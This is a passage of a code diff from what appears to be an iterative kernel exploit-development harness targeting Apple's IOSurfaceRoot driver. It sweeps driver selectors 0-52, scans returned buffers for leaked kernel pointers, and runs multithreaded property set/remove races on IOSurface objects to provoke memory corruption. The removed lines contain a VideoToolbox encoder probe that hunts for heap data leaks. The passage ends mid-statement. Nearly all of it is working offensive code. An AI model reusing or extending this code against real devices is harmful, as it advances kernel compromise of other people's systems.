@@ -27724,39 +27724,111 @@ static void r499_exploit(void) {
     fflush(stdout);
 }
 
+
 /* ====================================================================
- * r500: IOSurface selector 19 deep probe + MaxQP=0 extra-byte analysis
+ * r500: Comprehensive IOSurface selector probe + sel19 investigation
  *
- * r499 found: sel 19 with 24-byte struct → kr=0 (SUCCESS)
- * r498 found: MaxQP=0 → 97 bytes output (7 extra bytes vs baseline 90)
+ * Findings from r499: ALL selectors 15-22 return kIOReturnNotPermitted
+ * (0xe00002c2) EXCEPT selector 19 with 24B struct which returns SUCCESS.
  *
- * Phase 1: Probe sel 19 with varied struct contents
- * Phase 2: Analyze MaxQP=0 extra 7 bytes for kernel data leak
- * Phase 3: IOSurface sel 19 as kernel heap primitive
+ * This round:
+ *  Phase 1 - Probe ALL selectors 0-52 with multiple input formats
+ *  Phase 2 - Deep investigation of accessible selectors (output buffers)
+ *  Phase 3 - Selector 19 deep analysis (varied struct contents)
+ *  Phase 4 - Framework-level API race conditions
  * ==================================================================== */
 
-static void r501_exploit(void) {
-    rlog("\n=== r501: STUB — property race being written ===\n");
-    rlog("  Use rounds=504 for r500 sel19 probe instead\n");
+struct r500_sel19_race_ctx {
+    io_connect_t conn;
+    uint32_t surface_id;
+    volatile int *go;
+    volatile int done;
+    kern_return_t kr;
+};
+
+static void *r500_sel19_thread(void *arg) {
+    struct r500_sel19_race_ctx *ctx = (struct r500_sel19_race_ctx *)arg;
+    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
+    while (!*ctx->go) __asm__ volatile("yield");
+    uint64_t st[3] = { ctx->surface_id, 0, 0 };
+    ctx->kr = IOConnectCallMethod(ctx->conn, 19, NULL, 0, st, 24, NULL, NULL, NULL, NULL);
+    ctx->done = 1;
+    return NULL;
+}
+
+struct r500_prop_race_ctx {
+    IOSurfaceRef surf;
+    CFStringRef key;
+    volatile int *go;
+    volatile int done;
+    int iterations;
+    int null_reads;
+    int mismatches;
+    int type_changes;
+};
+
+static void *r500_set_thread(void *arg) {
+    struct r500_prop_race_ctx *ctx = (struct r500_prop_race_ctx *)arg;
+    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
+    while (!*ctx->go) __asm__ volatile("yield");
+    for (int i = 0; i < ctx->iterations; i++) {
+        uint8_t data[24];
+        memset(data, 0xAA + (i & 0xF), 24);
+        uint32_t marker = 0xBEEF0000 | (i & 0xFFFF);
+        memcpy(data, &marker, 4);
+        CFDataRef val = CFDataCreate(NULL, data, 24);
+        IOSurfaceSetValue(ctx->surf, ctx->key, val);
+        CFRelease(val);
+    }
+    ctx->done = 1;
+    return NULL;
+}
+
+static void *r500_remove_read_thread(void *arg) {
+    struct r500_prop_race_ctx *ctx = (struct r500_prop_race_ctx *)arg;
+    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
+    while (!*ctx->go) __asm__ volatile("yield");
+    for (int i = 0; i < ctx->iterations; i++) {
+        IOSurfaceRemoveValue(ctx->surf, ctx->key);
+        CFTypeRef rv = IOSurfaceCopyValue(ctx->surf, ctx->key);
+        if (rv) {
+            if (CFGetTypeID(rv) == CFDataGetTypeID()) {
+                CFDataRef rd = (CFDataRef)rv;
+                CFIndex len = CFDataGetLength(rd);
+                if (len != 24)
+                    __sync_fetch_and_add(&ctx->mismatches, 1);
+                else {
+                    uint32_t m = 0;
+                    CFDataGetBytes(rd, CFRangeMake(0, 4), (uint8_t *)&m);
+                    if ((m & 0xFFFF0000) != 0xBEEF0000)
+                        __sync_fetch_and_add(&ctx->mismatches, 1);
+                }
+            } else {
+                __sync_fetch_and_add(&ctx->type_changes, 1);
+            }
+            CFRelease(rv);
+        } else {
+            __sync_fetch_and_add(&ctx->null_reads, 1);
+        }
+    }
+    ctx->done = 1;
+    return NULL;
 }
 
 static void r500_exploit(void) {
-    rlog("\n=== r500: comprehensive selector map + sel19 probe + MaxQP=0 ===\n\n");
+    rlog("\n=== r500: Comprehensive IOSurface selector probe ===\n\n");
     fflush(stdout);
+    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
 
     io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
         IOServiceMatching("IOSurfaceRoot"));
     io_connect_t conn = 0;
     kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
     IOObjectRelease(svc);
-    rlog("  conn=0x%x kr=0x%x\n", conn, kr);
-    if (kr != 0) goto r500_done;
+    rlog("IOSurfaceRoot: conn=0x%x kr=0x%x\n\n", conn, kr);
+    if (kr != KERN_SUCCESS || !conn) { rlog("FATAL: no conn\n"); return; }
 
-    /* Phase 0: Comprehensive selector map — test ALL selectors 0-52 */
-    rlog("--- Phase 0: IOSurface selector map (0-52) ---\n");
-
-    /* Create a surface */
-    CFMutableDictionaryRef sprops = CFDictionaryCreateMutable(NULL, 0,
+    CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
         &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
     int w = 64, h = 64, bpe = 4, bpr = 256, pf = 0x42475241;
     CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
@@ -27764,429 +27836,443 @@ static void r500_exploit(void) {
     CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
     CFNumberRef brn = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
     CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
-    CFDictionarySetValue(sprops, CFSTR("IOSurfaceWidth"), wn);
-    CFDictionarySetValue(sprops, CFSTR("IOSurfaceHeight"), hn);
-    CFDictionarySetValue(sprops, CFSTR("IOSurfaceBytesPerElement"), bn);
-    CFDictionarySetValue(sprops, CFSTR("IOSurfaceBytesPerRow"), brn);
-    CFDictionarySetValue(sprops, CFSTR("IOSurfacePixelFormat"), pfn);
-    IOSurfaceRef surf = IOSurfaceCreate(sprops);
-    CFRelease(sprops); CFRelease(wn); CFRelease(hn);
-    CFRelease(bn); CFRelease(brn); CFRelease(pfn);
-    uint32_t sid = IOSurfaceGetID(surf);
-    rlog("  Surface id=%u\n", sid);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), wn);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), hn);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), bn);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), brn);
+    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), pfn);
 
-    {
-        int accessible_count = 0, restricted_count = 0;
-        rlog("  Selector sweep (0-52):\n");
-        for (int sel = 0; sel <= 52; sel++) {
-            uint64_t si[6] = {sid, 0, 0, 0, 0, 0};
-            uint64_t so[6] = {0};
-            uint32_t so_cnt = 6;
-            uint8_t struct_in[64] = {0};
-            uint8_t struct_out[256] = {0};
-            size_t struct_out_sz = 256;
-            memcpy(struct_in, &sid, 4);
+    IOSurfaceRef probe_surf = IOSurfaceCreate(props);
+    uint32_t probe_id = probe_surf ? IOSurfaceGetID(probe_surf) : 0;
+    rlog("Probe surface: id=%u\n\n", probe_id);
 
-            /* Try: 1 scalar in, struct out */
-            kr = IOConnectCallMethod(conn, sel, si, 1, NULL, 0,
-                so, &so_cnt, struct_out, &struct_out_sz);
+    /* Phase 1: Probe ALL selectors 0-52 */
+    rlog("--- Phase 1: Full selector table probe (0-52) ---\n");
+    fflush(stdout);
 
-            char tag = ' ';
-            if (kr == 0) { tag = '+'; accessible_count++; }
-            else if (kr == 0xe00002c2) { tag = 'X'; restricted_count++; }
+    int accessible_sels[64];
+    int n_accessible = 0;
 
-            rlog("    [%c] sel %2d: kr=0x%08x", tag, sel, kr);
-            if (kr == 0) {
-                rlog(" so_cnt=%u ss=%zu", so_cnt, struct_out_sz);
-                /* Check for kernel pointers in output */
-                for (uint32_t i = 0; i < so_cnt; i++) {
-                    if ((so[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL)
-                        rlog(" *** KPTR so[%d]=0x%llx ***", i, (unsigned long long)so[i]);
-                }
-                for (size_t i = 0; i + 7 < struct_out_sz; i += 8) {
-                    uint64_t qw = *(uint64_t*)(struct_out + i);
-                    if ((qw & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL)
-                        rlog(" *** KPTR +%zu=0x%llx ***", i, (unsigned long long)qw);
-                }
-            }
-            rlog("\n");
+    for (uint32_t sel = 0; sel <= 52; sel++) {
+        kern_return_t results[7];
 
-            /* Reset for next */
-            so_cnt = 6;
-            struct_out_sz = 256;
-            memset(so, 0, sizeof(so));
-            memset(struct_out, 0, sizeof(struct_out));
-        }
-        rlog("  Summary: %d accessible, %d restricted, %d other\n",
-             accessible_count, restricted_count, 53 - accessible_count - restricted_count);
-    }
-
-    /* Phase 0b: Test framework-level property APIs */
-    rlog("\n--- Phase 0b: Framework-level property API test ---\n");
-    {
-        /* SetValue */
-        uint8_t testdata[64];
-        memset(testdata, 0x42, 64);
-        CFDataRef dat = CFDataCreate(NULL, testdata, 64);
-        IOSurfaceSetValue(surf, CFSTR("testkey"), dat);
-        CFRelease(dat);
-        rlog("  SetValue(testkey, 64B CFData): done\n");
-
-        /* CopyValue */
-        CFTypeRef val = IOSurfaceCopyValue(surf, CFSTR("testkey"));
-        if (val) {
-            if (CFGetTypeID(val) == CFDataGetTypeID()) {
-                CFDataRef d = (CFDataRef)val;
-                rlog("  CopyValue(testkey): CFData %ldB\n", (long)CFDataGetLength(d));
-                const uint8_t *bytes = CFDataGetBytePtr(d);
-                /* Check for corruption */
-                int corrupted = 0;
-                for (int i = 0; i < CFDataGetLength(d) && i < 64; i++) {
-                    if (bytes[i] != 0x42) { corrupted++; }
-                }
-                rlog("  Corruption check: %d bytes differ from 0x42\n", corrupted);
-            } else {
-                rlog("  CopyValue(testkey): type=%lu (not CFData)\n",
-                     (unsigned long)CFGetTypeID(val));
-            }
-            CFRelease(val);
-        } else {
-            rlog("  CopyValue(testkey): NULL\n");
-        }
-
-        /* RemoveValue */
-        IOSurfaceRemoveValue(surf, CFSTR("testkey"));
-        val = IOSurfaceCopyValue(surf, CFSTR("testkey"));
-        rlog("  RemoveValue + CopyValue: %s\n", val ? "STILL EXISTS" : "gone (correct)");
-        if (val) CFRelease(val);
-
-        /* Mach port roundtrip */
-        mach_port_t mp = IOSurfaceCreateMachPort(surf);
-        rlog("  CreateMachPort: port=0x%x\n", mp);
-        if (mp != MACH_PORT_NULL) {
-            IOSurfaceRef surf2 = IOSurfaceLookupFromMachPort(mp);
-            rlog("  LookupFromMachPort: surf=%p id=%u\n",
-                 (void*)surf2, surf2 ? IOSurfaceGetID(surf2) : 0);
-            if (surf2) CFRelease(surf2);
-            mach_port_deallocate(mach_task_self(), mp);
-        }
-    }
-
-    /* Phase 1: Deep probe IOSurface selector 19 */
-    rlog("\n--- Phase 1: IOSurface sel 19 deep probe ---\n");
-
-    /* 1a: sel19 with different struct sizes */
-    rlog("\n  1a: sel19 struct size sweep:\n");
-    for (int sz = 4; sz <= 64; sz += 4) {
-        uint8_t buf[64] = {0};
-        memcpy(buf, &sid, 4);
-        kr = IOConnectCallMethod(conn, 19, NULL, 0, buf, sz,
+        results[0] = IOConnectCallMethod(conn, sel, NULL, 0, NULL, 0,
             NULL, NULL, NULL, NULL);
-        rlog("    sel19 struct(%dB): kr=0x%x\n", sz, kr);
-    }
+        uint64_t s1[1] = { probe_id };
+        results[1] = IOConnectCallMethod(conn, sel, s1, 1, NULL, 0,
+            NULL, NULL, NULL, NULL);
+        uint64_t s2[2] = { probe_id, 0 };
+        results[2] = IOConnectCallMethod(conn, sel, s2, 2, NULL, 0,
+            NULL, NULL, NULL, NULL);
+        uint64_t s3[3] = { probe_id, 0, 0 };
+        results[3] = IOConnectCallMethod(conn, sel, s3, 3, NULL, 0,
+            NULL, NULL, NULL, NULL);
+        uint32_t st4 = probe_id;
+        results[4] = IOConnectCallMethod(conn, sel, NULL, 0, &st4, 4,
+            NULL, NULL, NULL, NULL);
+        uint64_t st24a[3] = { probe_id, 0, 0 };
+        results[5] = IOConnectCallMethod(conn, sel, NULL, 0, st24a, 24,
+            NULL, NULL, NULL, NULL);
+        uint64_t st24b[3] = { 0, probe_id, 0 };
+        results[6] = IOConnectCallMethod(conn, sel, NULL, 0, st24b, 24,
+            NULL, NULL, NULL, NULL);
 
-    /* 1b: sel19 with 24-byte struct, varied content */
-    rlog("\n  1b: sel19(24B) content variations:\n");
-    {
-        /* {sid, 0, 0} */
-        uint64_t s1[3] = {sid, 0, 0};
-        kr = IOConnectCallMethod(conn, 19, NULL, 0, s1, 24, NULL, NULL, NULL, NULL);
-        rlog("    {sid, 0, 0}: kr=0x%x\n", kr);
-
-        /* {0, sid, 0} */
-        uint64_t s2[3] = {0, sid, 0};
-        kr = IOConnectCallMethod(conn, 19, NULL, 0, s2, 24, NULL, NULL, NULL, NULL);
-        rlog("    {0, sid, 0}: kr=0x%x\n", kr);
-
-        /* {0, 0, sid} */
-        uint64_t s3[3] = {0, 0, sid};
-        kr = IOConnectCallMethod(conn, 19, NULL, 0, s3, 24, NULL, NULL, NULL, NULL);
-        rlog("    {0, 0, sid}: kr=0x%x\n", kr);
-
-        /* {sid, sid, sid} */
-        uint64_t s4[3] = {sid, sid, sid};
-        kr = IOConnectCallMethod(conn, 19, NULL, 0, s4, 24, NULL, NULL, NULL, NULL);
-        rlog("    {sid,sid,sid}: kr=0x%x\n", kr);
-
-        /* {0, 0, 0} */
-        uint64_t s5[3] = {0, 0, 0};
-        kr = IOConnectCallMethod(conn, 19, NULL, 0, s5, 24, NULL, NULL, NULL, NULL);
-        rlog("    {0, 0, 0}: kr=0x%x\n", kr);
-
-        /* {0xFFFFFFFF, 0, 0} */
-        uint64_t s6[3] = {0xFFFFFFFF, 0, 0};
-        kr = IOConnectCallMethod(conn, 19, NULL, 0, s6, 24, NULL, NULL, NULL, NULL);
-        rlog("    {0xFFFFFFFF, 0, 0}: kr=0x%x\n", kr);
-
-        /* {sid, 1, 0} through {sid, 10, 0} */
-        for (int v = 0; v <= 10; v++) {
-            uint64_t sv[3] = {sid, v, 0};
-            kr = IOConnectCallMethod(conn, 19, NULL, 0, sv, 24, NULL, NULL, NULL, NULL);
-            rlog("    {sid, %d, 0}: kr=0x%x\n", v, kr);
-        }
-    }
-
-    /* 1c: sel19 with output buffer to see what it returns */
-    rlog("\n  1c: sel19 with output:\n");
-    {
-        uint64_t s[3] = {sid, 0, 0};
-        uint64_t sout[8] = {0};
-        uint32_t sout_cnt = 8;
-        size_t sout_struct_sz = 64;
-        uint8_t sout_struct[64] = {0};
-
-        /* scalar output */
-        kr = IOConnectCallMethod(conn, 19, NULL, 0, s, 24,
-            sout, &sout_cnt, NULL, NULL);
-        rlog("    scalar out: kr=0x%x cnt=%u\n", kr, sout_cnt);
-        if (kr == 0 && sout_cnt > 0) {
-            for (uint32_t i = 0; i < sout_cnt; i++)
-                rlog("      out[%d] = 0x%016llx\n", i, (unsigned long long)sout[i]);
+        int any_interesting = 0;
+        for (int i = 0; i < 7; i++) {
+            if (results[i] != (kern_return_t)0xe00002c2)
+                any_interesting = 1;
         }
 
-        /* struct output */
-        kr = IOConnectCallMethod(conn, 19, NULL, 0, s, 24,
-            NULL, NULL, sout_struct, &sout_struct_sz);
-        rlog("    struct out: kr=0x%x sz=%zu\n", kr, sout_struct_sz);
-        if (kr == 0 && sout_struct_sz > 0) {
-            rlog("      data:");
-            for (size_t i = 0; i < sout_struct_sz && i < 64; i++)
-                rlog(" %02x", sout_struct[i]);
+        if (any_interesting) {
+            rlog("  sel%2u:", sel);
+            const char *labels[] = { "0in", "1sc", "2sc", "3sc", "st4", "st24a", "st24b" };
+            for (int i = 0; i < 7; i++) {
+                if (results[i] != (kern_return_t)0xe00002c2) {
+                    rlog(" %s=0x%x", labels[i], results[i]);
+                    if (results[i] == KERN_SUCCESS) rlog("***");
+                }
+            }
             rlog("\n");
-            for (size_t i = 0; i + 7 < sout_struct_sz; i += 8) {
-                uint64_t qw = *(uint64_t*)(sout_struct + i);
-                if (qw != 0) {
-                    rlog("      +%zu: 0x%016llx", i, (unsigned long long)qw);
-                    if ((qw & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL)
+            if (n_accessible < 64)
+                accessible_sels[n_accessible++] = sel;
+        }
+    }
+
+    rlog("\n  Total accessible (non-0xe00002c2) selectors: %d\n", n_accessible);
+    if (n_accessible > 0) {
+        rlog("  Accessible sels:");
+        for (int i = 0; i < n_accessible; i++) rlog(" %d", accessible_sels[i]);
+        rlog("\n");
+    }
+    rlog("\n");
+    fflush(stdout);
+
+    /* Phase 2: Deep probe accessible selectors with output buffers */
+    rlog("--- Phase 2: Deep probe of accessible selectors ---\n");
+    fflush(stdout);
+
+    for (int ai = 0; ai < n_accessible; ai++) {
+        uint32_t sel = accessible_sels[ai];
+        rlog("\n  === Selector %u deep probe ===\n", sel);
+
+        uint64_t osc[8] = {0};
+        uint32_t osc_cnt = 8;
+        uint64_t si3[3] = { probe_id, 0, 0 };
+        kr = IOConnectCallMethod(conn, sel, si3, 3, NULL, 0, osc, &osc_cnt, NULL, NULL);
+        rlog("    3sc + osc_out: kr=0x%x osc_cnt=%u\n", kr, osc_cnt);
+        if (kr == KERN_SUCCESS && osc_cnt > 0) {
+            for (uint32_t i = 0; i < osc_cnt && i < 8; i++) {
+                rlog("      osc[%u] = 0x%016llx", i, osc[i]);
+                if ((osc[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL)
+                    rlog(" *** KPTR ***");
+                rlog("\n");
+            }
+        }
+
+        uint8_t sout[128] = {0};
+        size_t sout_sz = 128;
+        kr = IOConnectCallMethod(conn, sel, si3, 3, NULL, 0, NULL, NULL, sout, &sout_sz);
+        rlog("    3sc + st_out(128): kr=0x%x out_sz=%zu\n", kr, sout_sz);
+        if (kr == KERN_SUCCESS && sout_sz > 0 && sout_sz <= 128) {
+            uint64_t *q = (uint64_t *)sout;
+            for (size_t i = 0; i < sout_sz / 8; i++) {
+                if (q[i] != 0) {
+                    rlog("      out[%zu] = 0x%016llx", i * 8, q[i]);
+                    if ((q[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL)
                         rlog(" *** KPTR ***");
                     rlog("\n");
                 }
             }
         }
 
-        /* Both */
-        memset(sout, 0, sizeof(sout));
-        memset(sout_struct, 0, sizeof(sout_struct));
-        sout_cnt = 8;
-        sout_struct_sz = 64;
-        kr = IOConnectCallMethod(conn, 19, NULL, 0, s, 24,
-            sout, &sout_cnt, sout_struct, &sout_struct_sz);
-        rlog("    both out: kr=0x%x sc=%u ss=%zu\n", kr, sout_cnt, sout_struct_sz);
-    }
-
-    /* 1d: Call sel 19 many times and check surface state */
-    rlog("\n  1d: Repeated sel19 calls + surface state check:\n");
-    {
-        uint64_t s[3] = {sid, 0, 0};
-        for (int i = 0; i < 100; i++) {
-            s[1] = i;
-            kr = IOConnectCallMethod(conn, 19, NULL, 0, s, 24, NULL, NULL, NULL, NULL);
-        }
-        rlog("    100 calls done, last kr=0x%x\n", kr);
-
-        /* Check if surface properties changed */
-        CFDictionaryRef allVals = IOSurfaceCopyAllValues(surf);
-        if (allVals) {
-            CFIndex cnt = CFDictionaryGetCount(allVals);
-            rlog("    Surface properties after 100 sel19 calls: %ld\n", (long)cnt);
-            CFRelease(allVals);
-        }
-
-        /* Check surface pixel data */
-        IOSurfaceLock(surf, 0, NULL);
-        void *base = IOSurfaceGetBaseAddress(surf);
-        uint64_t *qbase = (uint64_t*)base;
-        int nonzero = 0, kptr = 0;
-        for (int i = 0; i < 2048; i++) {
-            if (qbase[i] != 0) nonzero++;
-            if ((qbase[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
-                kptr++;
-                if (kptr <= 3)
-                    rlog("    KPTR at base+%d: 0x%016llx\n", i * 8, (unsigned long long)qbase[i]);
-            }
-        }
-        IOSurfaceUnlock(surf, 0, NULL);
-        rlog("    Surface pixel data: %d nonzero qwords, %d kptrs\n", nonzero, kptr);
-    }
-
-    CFRelease(surf);
-    IOServiceClose(conn);
-
-    /* Phase 2: MaxQP=0 extra-byte analysis */
-    rlog("\n--- Phase 2: MaxQP=0 extra-byte deep analysis ---\n");
-    {
-        /* MaxQP=0 produced 97 bytes vs baseline 90 — 7 extra bytes.
-         * Those 7 bytes could contain uninitialized kernel/heap data.
-         * Strategy: Encode many frames with MaxQP=0, compare the extra bytes.
-         * If they vary between frames, they might contain heap data. */
-
-        int trial_count = 20;
-        uint8_t extras[20][16] = {{0}};
-        int extra_lens[20] = {0};
-        int total_extra = 0;
-
-        for (int trial = 0; trial < trial_count; trial++) {
-            VTCompressionSessionRef enc = NULL;
-            CFMutableDictionaryRef espec = CFDictionaryCreateMutable(NULL, 0,
-                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
-            int tw = 128, th = 128;
-            CFNumberRef twn = CFNumberCreate(NULL, kCFNumberIntType, &tw);
-            CFNumberRef thn = CFNumberCreate(NULL, kCFNumberIntType, &th);
-            CFDictionarySetValue(espec, CFSTR("Width"), twn);
-            CFDictionarySetValue(espec, CFSTR("Height"), thn);
-
-            OSStatus st = VTCompressionSessionCreate(NULL, tw, th,
-                kCMVideoCodecType_HEVC, espec, NULL, NULL,
-                r498_enc_cb, NULL, &enc);
-            CFRelease(espec); CFRelease(twn); CFRelease(thn);
-            if (st != 0 || !enc) continue;
-
-            /* Set MaxQP=0 */
-            CFNumberRef zero = CFNumberCreate(NULL, kCFNumberIntType, &(int){0});
-            VTSessionSetProperty(enc, CFSTR("MaxQuantizationParameter"), zero);
-            CFRelease(zero);
-            VTCompressionSessionPrepareToEncodeFrames(enc);
-
-            /* Create pixel buffer */
-            CVPixelBufferRef pb = NULL;
-            CVPixelBufferCreate(NULL, tw, th, kCVPixelFormatType_32BGRA,
-                NULL, &pb);
-            CVPixelBufferLockBaseAddress(pb, 0);
-            memset(CVPixelBufferGetBaseAddress(pb), (trial * 7) & 0xFF,
-                   CVPixelBufferGetDataSize(pb));
-            CVPixelBufferUnlockBaseAddress(pb, 0);
-
-            /* Encode */
-            CMTime pts = CMTimeMake(trial, 30);
-            r498_outlen = 0;
-            VTCompressionSessionEncodeFrame(enc, pb, pts, kCMTimeInvalid, NULL, NULL, NULL);
-            VTCompressionSessionCompleteFrames(enc, kCMTimePositiveInfinity);
-
-            if (r498_outlen > 90) {
-                int extra = r498_outlen - 90;
-                extra_lens[trial] = extra;
-                memcpy(extras[trial], r498_outbuf + 90, extra < 16 ? extra : 16);
-                total_extra++;
-            }
-
-            VTCompressionSessionInvalidate(enc);
-            CFRelease(enc);
-            CVPixelBufferRelease(pb);
-        }
-
-        rlog("  Trials with extra bytes: %d/%d\n", total_extra, trial_count);
-
-        if (total_extra > 1) {
-            rlog("  Extra byte comparison (offset 90+):\n");
-            int varies = 0;
-            for (int i = 0; i < 16; i++) {
-                int min = 255, max = 0, count = 0;
-                for (int t = 0; t < trial_count; t++) {
-                    if (extra_lens[t] > i) {
-                        uint8_t b = extras[t][i];
-                        if (b < min) min = b;
-                        if (b > max) max = b;
-                        count++;
-                    }
-                }
-                if (count > 1) {
-                    rlog("    byte[%d]: min=0x%02x max=0x%02x range=%d%s\n",
-                         i, min, max, max - min,
-                         (min != max) ? " *** VARIES ***" : "");
-                    if (min != max) varies++;
-                }
-            }
-            rlog("  %d byte positions vary across trials\n", varies);
-
-            /* Dump all extra byte arrays for comparison */
-            rlog("  Raw extra bytes per trial:\n");
-            for (int t = 0; t < trial_count; t++) {
-                if (extra_lens[t] > 0) {
-                    rlog("    trial%02d (%dB):", t, extra_lens[t]);
-                    for (int i = 0; i < extra_lens[t] && i < 16; i++)
-                        rlog(" %02x", extras[t][i]);
+        uint64_t st_in[3] = { probe_id, 0, 0 };
+        memset(sout, 0, 128);
+        sout_sz = 128;
+        kr = IOConnectCallMethod(conn, sel, NULL, 0, st_in, 24, NULL, NULL, sout, &sout_sz);
+        rlog("    st24_in + st_out(128): kr=0x%x out_sz=%zu\n", kr, sout_sz);
+        if (kr == KERN_SUCCESS && sout_sz > 0 && sout_sz <= 128) {
+            uint64_t *q = (uint64_t *)sout;
+            for (size_t i = 0; i < sout_sz / 8; i++) {
+                if (q[i] != 0) {
+                    rlog("      out[%zu] = 0x%016llx", i * 8, q[i]);
+                    if ((q[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL)
+                        rlog(" *** KPTR ***");
                     rlog("\n");
                 }
             }
         }
 
-        /* Phase 2b: MaxQP=0 with varied pixel data to isolate entropy source */
-        rlog("\n  Phase 2b: MaxQP=0 with identical pixel data:\n");
-        {
-            uint8_t same_extras[5][16] = {{0}};
-            int same_extra_lens[5] = {0};
-            for (int trial = 0; trial < 5; trial++) {
-                VTCompressionSessionRef enc = NULL;
-                CFMutableDictionaryRef espec = CFDictionaryCreateMutable(NULL, 0,
-                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
-                int tw = 128, th = 128;
-                CFNumberRef twn = CFNumberCreate(NULL, kCFNumberIntType, &tw);
-                CFNumberRef thn = CFNumberCreate(NULL, kCFNumberIntType, &th);
-                CFDictionarySetValue(espec, CFSTR("Width"), twn);
-                CFDictionarySetValue(espec, CFSTR("Height"), thn);
-
-                VTCompressionSessionCreate(NULL, tw, th,
-                    kCMVideoCodecType_HEVC, espec, NULL, NULL,
-                    r498_enc_cb, NULL, &enc);
-                CFRelease(espec); CFRelease(twn); CFRelease(thn);
-                if (!enc) continue;
-
-                CFNumberRef zero = CFNumberCreate(NULL, kCFNumberIntType, &(int){0});
-                VTSessionSetProperty(enc, CFSTR("MaxQuantizationParameter"), zero);
-                CFRelease(zero);
-                VTCompressionSessionPrepareToEncodeFrames(enc);
-
-                CVPixelBufferRef pb = NULL;
-                CVPixelBufferCreate(NULL, 128, 128, kCVPixelFormatType_32BGRA,
-                    NULL, &pb);
-                CVPixelBufferLockBaseAddress(pb, 0);
-                memset(CVPixelBufferGetBaseAddress(pb), 0x80,
-                       CVPixelBufferGetDataSize(pb));
-                CVPixelBufferUnlockBaseAddress(pb, 0);
-
-                r498_outlen = 0;
-                VTCompressionSessionEncodeFrame(enc, pb, CMTimeMake(0, 30),
-                    kCMTimeInvalid, NULL, NULL, NULL);
-                VTCompressionSessionCompleteFrames(enc, kCMTimePositiveInfinity);
-
-                if (r498_outlen > 90) {
-                    same_extra_lens[trial] = r498_outlen - 90;
-                    memcpy(same_extras[trial], r498_outbuf + 90,
-                           same_extra_lens[trial] < 16 ? same_extra_lens[trial] : 16);
-                }
-                rlog("    trial%d: len=%d\n", trial, r498_outlen);
-
-                VTCompressionSessionInvalidate(enc);
-                CFRelease(enc);
-                CVPixelBufferRelease(pb);
-            }
-
-            /* Compare */
-            int identical = 1;
-            for (int t = 1; t < 5; t++) {
-                if (same_extra_lens[t] != same_extra_lens[0] ||
-                    memcmp(same_extras[t], same_extras[0], same_extra_lens[0]) != 0) {
-                    identical = 0;
-                    break;
-                }
-            }
-            rlog("    Same-pixel extra bytes: %s\n",
-                 identical ? "IDENTICAL (deterministic)" : "DIFFER (heap/entropy leak!)");
-            if (!identical) {
-                for (int t = 0; t < 5; t++) {
-                    rlog("      t%d:", t);
-                    for (int i = 0; i < same_extra_lens[t] && i < 16; i++)
-                        rlog(" %02x", same_extras[t][i]);
+        uint64_t st_in2[3] = { 0, probe_id, 0 };
+        memset(sout, 0, 128);
+        sout_sz = 128;
+        kr = IOConnectCallMethod(conn, sel, NULL, 0, st_in2, 24, NULL, NULL, sout, &sout_sz);
+        rlog("    st24{0,id,0} + st_out(128): kr=0x%x out_sz=%zu\n", kr, sout_sz);
+        if (kr == KERN_SUCCESS && sout_sz > 0 && sout_sz <= 128) {
+            uint64_t *q = (uint64_t *)sout;
+            for (size_t i = 0; i < sout_sz / 8; i++) {
+                if (q[i] != 0) {
+                    rlog("      out[%zu] = 0x%016llx", i * 8, q[i]);
+                    if ((q[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL)
+                        rlog(" *** KPTR ***");
                     rlog("\n");
+                }
+            }
+        }
+
+        osc_cnt = 8;
+        memset(osc, 0, sizeof(osc));
+        memset(sout, 0, 128);
+        sout_sz = 128;
+        uint64_t s1v[1] = { probe_id };
+        kr = IOConnectCallMethod(conn, sel, s1v, 1, st_in, 24, osc, &osc_cnt, sout, &sout_sz);
+        rlog("    1sc+st24_in + both_out: kr=0x%x osc=%u sout=%zu\n", kr, osc_cnt, sout_sz);
+        if (kr == KERN_SUCCESS) {
+            for (uint32_t i = 0; i < osc_cnt && i < 8; i++) {
+                if (osc[i] != 0)
+                    rlog("      osc[%u] = 0x%016llx%s\n", i, osc[i],
+                        (osc[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL ? " *** KPTR ***" : "");
+            }
+            if (sout_sz > 0) {
+                uint64_t *q = (uint64_t *)sout;
+                for (size_t i = 0; i < sout_sz / 8 && i < 16; i++) {
+                    if (q[i] != 0)
+                        rlog("      sout[%zu] = 0x%016llx%s\n", i * 8, q[i],
+                            (q[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL ? " *** KPTR ***" : "");
+                }
+            }
+        }
+
+        int sizes[] = { 4, 8, 12, 16, 24, 32, 48, 64, 128 };
+        rlog("    Varied struct input sizes:");
+        for (int si = 0; si < 9; si++) {
+            uint8_t buf[128];
+            memset(buf, 0, 128);
+            uint32_t id = probe_id;
+            memcpy(buf, &id, 4);
+            kr = IOConnectCallMethod(conn, sel, NULL, 0, buf, sizes[si],
